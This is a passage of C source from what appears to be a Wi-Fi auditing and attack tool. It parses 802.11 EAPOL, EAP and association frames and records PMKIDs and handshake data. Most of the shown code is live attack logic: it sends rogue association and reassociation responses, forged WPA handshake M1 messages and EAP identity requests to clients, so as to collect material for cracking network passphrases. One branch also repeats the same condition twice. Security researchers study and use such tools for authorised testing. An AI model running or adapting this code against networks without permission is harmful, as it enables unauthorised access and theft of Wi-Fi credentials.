	if(ptrfscanlist->channel >= 100) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x [ESSID NOT RECEIVED YET] [%s:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x KDV:%d]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
						client[0], client[1], client[2], client[3], client[4], client[5],
						ap[0], ap[1], ap[2], ap[3], ap[4], ap[5], msg,
						pmkid[0], pmkid[1], pmkid[2], pmkid[3], pmkid[4], pmkid[5], pmkid[6], pmkid[7],
						pmkid[8], pmkid[9], pmkid[10], pmkid[11], pmkid[12], pmkid[13], pmkid[14], pmkid[15],
						kdv);
	else if(ptrfscanlist->channel >= 100) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d  %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x [ESSID NOT RECEIVED YET] [%s:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x KDV:%d]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
						client[0], client[1], client[2], client[3], client[4], client[5],
						ap[0], ap[1], ap[2], ap[3], ap[4], ap[5], msg,
						pmkid[0], pmkid[1], pmkid[2], pmkid[3], pmkid[4], pmkid[5], pmkid[6], pmkid[7],
						pmkid[8], pmkid[9], pmkid[10], pmkid[11], pmkid[12], pmkid[13], pmkid[14], pmkid[15],
						kdv);
	else snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d   %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x [ESSID NOT RECEIVED YET] [%s:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x KDV:%d]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
			client[0], client[1], client[2], client[3], client[4], client[5],
			ap[0], ap[1], ap[2], ap[3], ap[4], ap[5], msg,
			pmkid[0], pmkid[1], pmkid[2], pmkid[3], pmkid[4], pmkid[5], pmkid[6], pmkid[7],
			pmkid[8], pmkid[9], pmkid[10], pmkid[11], pmkid[12], pmkid[13], pmkid[14], pmkid[15],
			kdv);
	}
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) serversendstatus(servermsg, strlen(servermsg));
else fprintf(stdout, "%s", servermsg);
return;
}
/*===========================================================================*/
static inline void process80211eapol_m1_own(uint16_t authlen, uint8_t keyinfo, uint8_t *wpakptr)
{
static wpakey_t *wpak;
static pmkid_t *pmkid;

if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
wpak = (wpakey_t*)wpakptr;
lasttimestamp = timestamp;
memcpy(&lastclient, macfrx->addr1, 6);
memcpy(&lastap, macfrx->addr2, 6);
lastrc = be64toh(wpak->replaycount);
lastkeyinfo = keyinfo;
lastkeyver = ntohs(wpak->keyinfo) & WPA_KEY_INFO_TYPE_MASK;
if(addownap(AP_M1, macfrx->addr2) == false) return;
if(authlen >= WPAKEY_SIZE +PMKID_SIZE)
	{
	pmkid = (pmkid_t*)(wpakptr +WPAKEY_SIZE);
	if(pmkid->id != TAG_VENDOR) return;
	if(memcmp(pmkid->pmkid, &zeroed32, 16) != 0)
		{
		if((pmkid->len == 0x14) && (pmkid->type == 0x04))
			{
			if(addownap(AP_PMKID, macfrx->addr3) == false) return;
			pmkidroguecount++;
			if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printpmkid(macfrx->addr1, macfrx->addr3, pmkid->pmkid, lastkeyver, "PMKIDROGUE");
			}
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211eapol_m1(uint16_t authlen, uint8_t keyinfo, uint8_t *wpakptr)
{
static wpakey_t *wpak;
static pmkid_t *pmkid;

if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
wpak = (wpakey_t*)wpakptr;
lasttimestamp = timestamp;
memcpy(&lastclient, macfrx->addr1, 6);
memcpy(&lastap, macfrx->addr2, 6);
lastrc = be64toh(wpak->replaycount);
lastkeyinfo = keyinfo;
lastkeyver = ntohs(wpak->keyinfo) & WPA_KEY_INFO_TYPE_MASK;
if((statusout &STATUS_EAPOL) == STATUS_EAPOL) memcpy(&lastanonce, wpak->nonce, 32);
if(authlen >= WPAKEY_SIZE +PMKID_SIZE)
	{
	pmkid = (pmkid_t*)(wpakptr +WPAKEY_SIZE);
	if(pmkid->id != TAG_VENDOR) return;
	if(memcmp(pmkid->pmkid, &zeroed32, 16) != 0)
		{
		if((pmkid->len == 0x14) && (pmkid->type == 0x04))
			{
			if(addownap(AP_PMKID, macfrx->addr3) == false) return;
			pmkidcount++;
			if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printpmkid(macfrx->addr1, macfrx->addr3, pmkid->pmkid, lastkeyver, "PMKID");
			}
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211eapol(uint16_t authlen)
{
static uint8_t *wpakptr;
static wpakey_t *wpak;
static uint16_t keyinfo;

wpakptr = payloadptr +LLC_SIZE +EAPAUTH_SIZE;
wpak = (wpakey_t*)wpakptr;
keyinfo = (getkeyinfo(ntohs(wpak->keyinfo)));
if(keyinfo == 1)
	{
	if(memcmp(&mac_myclient, macfrx->addr1, 6) == 0) process80211eapol_m1_own(authlen, keyinfo, wpakptr);
	else process80211eapol_m1(authlen, keyinfo, wpakptr);
	return;
	}
if(keyinfo == 2) process80211eapol_m2(keyinfo, wpakptr);
else if(keyinfo == 3) process80211eapol_m3(keyinfo, wpakptr);
else if(keyinfo == 4) process80211eapol_m4(keyinfo, wpakptr);
return;
}
/*===========================================================================*/
static inline void process80211eap()
{
static uint8_t *eapauthptr;
static eapauth_t *eapauth;
static uint16_t eapauthlen;
static uint16_t authlen;

eapauthptr = payloadptr +LLC_SIZE;
eapauthlen = payloadlen -LLC_SIZE;
eapauth = (eapauth_t*)eapauthptr;
authlen = ntohs(eapauth->len);
if(authlen > (eapauthlen -4)) return;
if(eapauth->type == EAPOL_KEY)
	{
	if(authlen >= WPAKEY_SIZE) process80211eapol(authlen);
	}
else if(eapauth->type == EAP_PACKET) process80211exteap(authlen);
else if(eapauth->type == EAPOL_ASF) process80211exteap_asf();
else if(eapauth->type == EAPOL_MKA) process80211exteap_mka();
else if((eapauth->type == EAPOL_START) && (macfrx->to_ds == 1))
	{
	if(((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) && (memcmp(&lastauthap, macfrx->addr1, 6) == 0))
		{
		send_eap_request_id(NULL);
		lastauthtimestamp = timestamp;
		}
	}
else if(eapauth->type == EAPOL_LOGOFF) return;
else
	{
	if(fd_pcapng > 0)
		{
		if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
		}
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void process80211data_wep()
{
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_WEP) == PCAPNG_FRAME_WEP) writeepb(fd_pcapng);
	}
return;
}
/*===========================================================================*/
static inline void process80211data_wpa()
{
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_WPA) == PCAPNG_FRAME_WPA) writeepb(fd_pcapng);
	}
}
/*===========================================================================*/
static inline void process80211rts()
{
static macessidlist_t *zeiger;

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
	if((zeiger->status &FILTERED) == FILTERED) return;
	zeiger->timestamp = timestamp;
	if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
	memcpy(zeiger->client, macfrx->addr2, 6);
	return;
	}
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) return;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	if((zeiger->status &FILTERED) == FILTERED) return;
	zeiger->timestamp = timestamp;
	if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
	memcpy(zeiger->client, macfrx->addr1, 6);
	return;
	}
return;
}
/*===========================================================================*/
static inline void process80211blockack_req()
{
static macessidlist_t *zeiger;

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
	if((zeiger->status &FILTERED) == FILTERED) return;
	zeiger->timestamp = timestamp;
	if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
	memcpy(zeiger->client, macfrx->addr2, 6);
	return;
	}
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) return;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	if((zeiger->status &FILTERED) == FILTERED) return;
	zeiger->timestamp = timestamp;
	if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
	memcpy(zeiger->client, macfrx->addr1, 6);
	return;
	}
return;
}
/*===========================================================================*/
static inline void process80211blockack()
{
static macessidlist_t *zeiger;

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
	if((zeiger->status &FILTERED) == FILTERED) return;
	zeiger->timestamp = timestamp;
	if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
	memcpy(zeiger->client, macfrx->addr2, 6);
	return;
	}
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) return;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	if((zeiger->status &FILTERED) == FILTERED) return;
	zeiger->timestamp = timestamp;
	if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
	memcpy(zeiger->client, macfrx->addr1, 6);
	return;
	}
return;
}
/*===========================================================================*/
static inline void process80211powersave_poll()
{
static macessidlist_t *zeiger;

if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
	{
	for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
		if((zeiger->status &FILTERED) == FILTERED) return;
		zeiger->timestamp = timestamp;
		if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
		memcpy(zeiger->client, macfrx->addr2, 6);
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211action()
{
static actf_t *actf;

if(payloadlen < ACTIONFRAME_SIZE) return;
if(fd_pcapng > 0)
	{
	actf = (actf_t*)payloadptr;
	if(actf->categoriecode == CAT_VENDOR)
		{
		if((pcapngframesout &PCAPNG_FRAME_VENDOR) == PCAPNG_FRAME_VENDOR) writeepb(fd_pcapng);
		}
	else if(actf->categoriecode == CAT_RADIO_MEASUREMENT)
		{
		if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
		}
	}
if(((timestamp -lastauthtimestamp) > eapoltimeoutvalue) || ((lastauthkeyver == 0) && ((timestamp -lastauthtimestamp) > eapoleaptimeoutvalue))) return;
if(memcmp(&lastauthap, macfrx->addr1, 6) != 0) return;
if(lastauthkeyver == 2) send_m1_wpa2();
else if(lastauthkeyver == 1) send_m1_wpa1();
return;
}
/*===========================================================================*/
static inline void process80211ack()
{
if(((timestamp -lastauthtimestamp) > eapoltimeoutvalue) || ((lastauthkeyver == 0) && ((timestamp -lastauthtimestamp) > eapoleaptimeoutvalue))) return;
if(memcmp(&lastauthap, macfrx->addr1, 6) != 0) return;
packetsentflag = false;
if(lastauthkeyver == 2) send_m1_wpa2();
else if(lastauthkeyver == 1) send_m1_wpa1();
return;
}
/*===========================================================================*/
static inline void process80211null()
{
static macessidlist_t *zeiger;

if((macfrx->to_ds == 0) && (macfrx->from_ds == 1))
	{
	for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
		if((zeiger->status &FILTERED) == FILTERED) return;
		if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
		memcpy(zeiger->client, macfrx->addr1, 6);
		return;
		}
	return;
	}
if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
	{
	if(((timestamp -lastauthtimestamp) <= eapoltimeoutvalue) || ((lastauthkeyver == 0) && ((timestamp -lastauthtimestamp) <= eapoleaptimeoutvalue)))
		{
		if(memcmp(&lastauthap, macfrx->addr1, 6) == 0)
			{
			if(lastauthkeyver == 2) send_m1_wpa2();
			else if(lastauthkeyver == 1) send_m1_wpa1();
			return;
			}
		}
	for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
		if((zeiger->status &FILTERED) == FILTERED) return;
		zeiger->timestamp = timestamp;
		if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
		memcpy(zeiger->client, macfrx->addr2, 6);
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211qosnull()
{
static macessidlist_t *zeiger;

if((macfrx->to_ds == 0) && (macfrx->from_ds == 1))
	{
	memset(&lastauthap, 0, 6);
	memset(&lastauthclient, 0, 6);
	lastauthtimestamp = 0;
	for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
		if((zeiger->status &FILTERED) == FILTERED) return;
		if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
		memcpy(zeiger->client, macfrx->addr1, 6);
		return;
		}
	return;
	}
if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
	{
	if((((timestamp -lastauthtimestamp) <= eapoltimeoutvalue) || ((lastauthkeyver == 0) && ((timestamp -lastauthtimestamp) <= eapoleaptimeoutvalue)))
		&& (memcmp(&lastauthap, macfrx->addr1, 6) == 0))
		{
		if(lastauthkeyver == 2) send_m1_wpa2();
		else if(lastauthkeyver == 1) send_m1_wpa1();
		return;
		}
	for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
		if((zeiger->status &FILTERED) == FILTERED) return;
		zeiger->timestamp = timestamp;
		if(memcmp(&mac_null, zeiger->client, 6) == 0) zeiger->count = 0;
		memcpy(zeiger->client, macfrx->addr2, 6);
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211deauth()
{
static ownlist_t *zeiger;
if((macfrx->to_ds == 1) && (macfrx->from_ds == 0))
	{
	if(memcmp(&lastauthap, macfrx->addr1, 6) != 0) return;
	if((lastauthkeyver == 0) && ((timestamp -lastauthtimestamp) > eapoleaptimeoutvalue)) return;
	if((lastauthkeyver > 0) && ((timestamp -lastauthtimestamp) > eapoltimeoutvalue)) return;
	for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
		{
		if(zeiger->timestamp == 0) break;
		if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
		if(memcmp(zeiger->client, macfrx->addr2, 6) != 0) continue;
		if(zeiger->eapctx.tlstun == true)
			{
			SSL_shutdown(eaptlsctx->ssl);
			SSL_free(eaptlsctx->ssl);
			eaptlsctx->ssl = NULL;
			zeiger->eapctx.tlstun = false;
			}
		}
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void process80211reassociation_resp()
{
static macessidlist_t *zeiger;

if(payloadlen < ASSOCIATIONRESPFRAME_SIZE) return;
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if((zeiger->status &FILTERED) == FILTERED) return;
	if((zeiger->status &AP_REASSOC_RESP) != AP_REASSOC_RESP)
		{
		zeiger->status |= AP_REASSOC_RESP;
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
		}
	return;
	}
memset(zeiger, 0, MACESSIDLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->status = AP_REASSOC_RESP;
memcpy(zeiger->ap, macfrx->addr2, 6);
if(filtermode != 0)
	{
	if(setapfilter(zeiger) == true)
		{
		qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
		return;
		}
	}
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211reassociation_req()
{
static uint8_t *clientinfoptr;
static uint16_t clientinfolen;
static ownlist_t *zeiger;
static tags_t tags;

clientinfoptr = payloadptr +CAPABILITIESREQSTA_SIZE;
clientinfolen = payloadlen -CAPABILITIESREQSTA_SIZE;
if(clientinfolen < IETAG_SIZE) return;
for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
	if(memcmp(zeiger->client, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	gettags(clientinfolen, clientinfoptr, &tags);
	if((tags.essidlen != 0) && (tags.essid[0] != 0))
		{
		zeiger->essidlen = tags.essidlen;
		memcpy(zeiger->essid, tags.essid, tags.essidlen);
		}
	if(zeiger->status >= OW_M2M3) return;
	if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
		{
		if(((tags.akm &TAK_PSK) == TAK_PSK) || ((tags.akm &TAK_PSKSHA256) == TAK_PSKSHA256))
			{
			if((tags.kdversion &KV_RSNIE) == KV_RSNIE)
				{
				send_reassociation_resp();
				memcpy(&lastauthap, macfrx->addr1, 6);
				memcpy(&lastauthclient, macfrx->addr2, 6);
				lastauthtimestamp = timestamp;
				lastauthkeyver = 2;
				}
			else if((tags.kdversion &KV_WPAIE) == KV_WPAIE)
				{
				send_reassociation_resp();
				memcpy(&lastauthap, macfrx->addr1, 6);
				memcpy(&lastauthclient, macfrx->addr2, 6);
				lastauthtimestamp = timestamp;
				lastauthkeyver = 1;
				}
			}
		}
	if((zeiger->status &OW_REASSOC) != OW_REASSOC)
		{
		zeiger->status |= OW_REASSOC;
		gettags(clientinfolen, clientinfoptr, &tags);
		zeiger->timestamp = timestamp;
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		if((statusout &STATUS_ASSOCIATION) == STATUS_ASSOCIATION) printown(zeiger, "REASSOCIATION");
		}
	return;
	}
memset(zeiger, 0, OWNLIST_SIZE);
gettags(clientinfolen, clientinfoptr, &tags);
zeiger->timestamp = timestamp;
zeiger->status = OW_REASSOC;
memcpy(zeiger->ap, macfrx->addr1, 6);
memcpy(zeiger->client, macfrx->addr2, 6);
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, tags.essidlen);
if(filtermode != 0)
	{
	if(setclientfilter(zeiger) == true)
		{
		qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
		return;
		}
	}
if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
	{
	if(((tags.akm &TAK_PSK) == TAK_PSK) || ((tags.akm &TAK_PSKSHA256) == TAK_PSKSHA256))
		{
		if((tags.kdversion &KV_RSNIE) == KV_RSNIE)
			{
			send_reassociation_resp();
			memcpy(&lastauthap, macfrx->addr1, 6);
			memcpy(&lastauthclient, macfrx->addr2, 6);
			lastauthtimestamp = timestamp;
			lastauthkeyver = 2;
			}
		else if((tags.kdversion &KV_WPAIE) == KV_WPAIE)
			{
			send_reassociation_resp();
			memcpy(&lastauthap, macfrx->addr1, 6);
			memcpy(&lastauthclient, macfrx->addr2, 6);
			lastauthtimestamp = timestamp;
			lastauthkeyver = 1;
			}
		}
	}
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if((statusout &STATUS_ASSOCIATION) == STATUS_ASSOCIATION) printown(zeiger, "REASSOCIATION");
qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void process80211association_resp()
{
static macessidlist_t *zeiger;

if(payloadlen < ASSOCIATIONRESPFRAME_SIZE) return;
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if((zeiger->status &FILTERED) == FILTERED) return;
	if((zeiger->status &AP_ASSOC_RESP) != AP_ASSOC_RESP)
		{
		zeiger->status |= AP_ASSOC_RESP;
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
		}
	return;
	}
memset(zeiger, 0, MACESSIDLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->status = AP_ASSOC_RESP;
memcpy(zeiger->ap, macfrx->addr2, 6);
if(filtermode != 0)
	{
	if(setapfilter(zeiger) == true)
		{
		qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
		return;
		}
	}
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
qsort(aplist, zeiger -aplist +1, MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211association_req()
{
static uint8_t *clientinfoptr;
static uint16_t clientinfolen;
static ownlist_t *zeiger;
static tags_t tags;

clientinfoptr = payloadptr +CAPABILITIESSTA_SIZE;
clientinfolen = payloadlen -CAPABILITIESSTA_SIZE;
if(clientinfolen < IETAG_SIZE) return;
for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
	if(memcmp(zeiger->client, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	gettags(clientinfolen, clientinfoptr, &tags);
	if(eapreqflag == true && ((zeiger->essidlen != tags.essidlen) || (memcmp(zeiger->essid, tags.essid, zeiger->essidlen) != 0)))
		{
		zeiger->eapctx.reqstate = 0;
		}
	if((tags.essidlen != 0) && (tags.essid[0] != 0))
		{
		zeiger->essidlen = tags.essidlen;
		memcpy(zeiger->essid, tags.essid, tags.essidlen);
		}
	if((zeiger->status >= OW_M1M2ROGUE) && (eapreqflag == false)) return;
	if(((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) && (zeiger->status < OW_M1M2ROGUE))
		{
		if(((tags.akm &TAK_PSK) == TAK_PSK) || ((tags.akm &TAK_PSKSHA256) == TAK_PSKSHA256))
			{
			if((tags.kdversion &KV_RSNIE) == KV_RSNIE)
				{
				send_association_resp();
				memcpy(&lastauthap, macfrx->addr1, 6);
				memcpy(&lastauthclient, macfrx->addr2, 6);
				lastauthtimestamp = timestamp;
				lastauthkeyver = 2;
				}
			else if((tags.kdversion &KV_WPAIE) == KV_WPAIE)
				{
				send_association_resp();
				memcpy(&lastauthap, macfrx->addr1,6);
				memcpy(&lastauthclient, macfrx->addr2,6);
				lastauthtimestamp = timestamp;
				lastauthkeyver = 1;
				}
			}
		}
	if(((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) && ((zeiger->status < OW_EAP_RESP) || ((eapreqflag == true) && (zeiger->eapctx.reqstate < eapreqentries))))
		{
		if(((tags.akm &TAK_PMKSA) == TAK_PMKSA) || ((tags.akm &TAK_PMKSA256) == TAK_PMKSA256))
			{
			if((tags.kdversion &KV_RSNIE) == KV_RSNIE)
				{
				if((eapreqflag == true) && (zeiger->eapctx.reqstate == eapreqentries)) return;
				if((timestamp -lastauthtimestamp) <= PACKET_RESEND_TIMER_USEC) return;
				send_association_resp();
				zeiger->eapctx.id = -1;
				send_eap_request_id(&zeiger->eapctx);
				memcpy(&lastauthap, macfrx->addr1, 6);
				memcpy(&lastauthclient, macfrx->addr2, 6);
				lastauthtimestamp = timestamp;
				lastauthkeyver = 0;
				}
			else if((tags.kdversion &KV_WPAIE) == KV_WPAIE)
				{
				if((eapreqflag == true) && (zeiger->eapctx.reqstate == eapreqentries)) return;
				if((timestamp -lastauthtimestamp) <= PACKET_RESEND_TIMER_USEC) return;
				send_association_resp();
				zeiger->eapctx.id = -1;
				send_eap_request_id(&zeiger->eapctx);
				memcpy(&lastauthap, macfrx->addr1,6);
				memcpy(&lastauthclient, macfrx->addr2,6);
				lastauthtimestamp = timestamp;
				lastauthkeyver = 0;
				}
			}
		}
	if((zeiger->status &OW_ASSOC) != OW_ASSOC)
		{
		zeiger->status |= OW_ASSOC;
		gettags(clientinfolen, clientinfoptr, &tags);
		zeiger->timestamp = timestamp;
		zeiger->essidlen = tags.essidlen;
		memcpy(zeiger->essid, tags.essid, tags.essidlen);
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		if((statusout &STATUS_ASSOCIATION) == STATUS_ASSOCIATION) printown(zeiger, "ASSOCIATION");
		}
	return;
	}
memset(zeiger, 0, OWNLIST_SIZE);
gettags(clientinfolen, clientinfoptr, &tags);
zeiger->timestamp = timestamp;
zeiger->status = OW_ASSOC;
memcpy(zeiger->ap, macfrx->addr1, 6);
memcpy(zeiger->client, macfrx->addr2, 6);
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, tags.essidlen);
if(filtermode != 0)
	{
	if(setclientfilter(zeiger) == true)
		{
		qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
		return;
		}
	}
if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
	{
	if(((tags.akm &TAK_PSK) == TAK_PSK) || ((tags.akm &TAK_PSKSHA256) == TAK_PSKSHA256))
		{
		if((tags.kdversion &KV_RSNIE) == KV_RSNIE)
			{
			send_association_resp();
			memcpy(&lastauthap, macfrx->addr1, 6);
			memcpy(&lastauthclient, macfrx->addr2, 6);
			lastauthtimestamp = timestamp;
			lastauthkeyver = 2;
			}
		else if((tags.kdversion &KV_WPAIE) == KV_WPAIE)
			{
			send_association_resp();
			memcpy(&lastauthap, macfrx->addr1, 6);
			memcpy(&lastauthclient, macfrx->addr2, 6);
			lastauthtimestamp = timestamp;
			lastauthkeyver = 1;
			}
		}
	if(((tags.akm &TAK_PMKSA) == TAK_PMKSA) || ((tags.akm &TAK_PMKSA256) == TAK_PMKSA256))
		{
		if((tags.kdversion &KV_RSNIE) == KV_RSNIE)
			{
			send_association_resp();
			zeiger->eapctx.id = -1;
			send_eap_request_id(&zeiger->eapctx);
			memcpy(&lastauthap, macfrx->addr1, 6);
			memcpy(&lastauthclient, macfrx->addr2, 6);
			lastauthtimestamp = timestamp;
			lastauthkeyver = 0;
			}
		else if((tags.kdversion &KV_WPAIE) == KV_WPAIE)
			{
			send_association_resp();
			zeiger->eapctx.id = -1;
			send_eap_request_id(&zeiger->eapctx);
			memcpy(&lastauthap, macfrx->addr1,6);
			memcpy(&lastauthclient, macfrx->addr2,6);
			lastauthtimestamp = timestamp;
			lastauthkeyver = 0;
			}
		}
	}
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if((statusout &STATUS_ASSOCIATION) == STATUS_ASSOCIATION) printown(zeiger, "ASSOCIATION");
qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void process80211authentication_sae()
{
static authf_t *auth;

if((attackstatus &DISABLE_AP_ATTACKS) == DISABLE_AP_ATTACKS) return;
if((attackstatus &DISABLE_CLIENT_ATTACKS) == DISABLE_CLIENT_ATTACKS) return;
auth = (authf_t*)payloadptr;
if(ntohs(auth->sequence) == 1)
	{
